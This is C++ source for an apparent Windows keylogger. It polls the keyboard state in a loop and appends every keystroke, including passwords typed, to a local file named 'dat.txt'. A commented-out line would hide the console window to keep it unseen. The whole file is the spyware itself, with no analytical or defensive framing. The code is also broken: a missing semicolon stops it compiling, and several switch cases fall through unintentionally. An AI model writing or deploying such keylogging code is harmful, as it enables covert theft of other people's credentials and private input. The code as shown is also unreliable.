#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>



using namespace std;



void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {

    // handle special keys
    // https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
	switch (S_Key) {

	    case VK_RBUTTON:
            LOG("#R-CLICK#");

        case VK_SPACE:
            LOG(" ");
            return true;

        case VK_CANCEL:
            LOG("#VK_CANCEL")

        case '¾':
            LOG(".");
            return true;

        case VK_RETURN:
            LOG("\n");
            return true;

        case VK_BACK:
            LOG("\b");
            return true;


            return true;

        case VK_MENU:
            LOG("#ALT");
            return true;

        default:
            return false;
	}
}

int main()
{
	// ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(5);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}
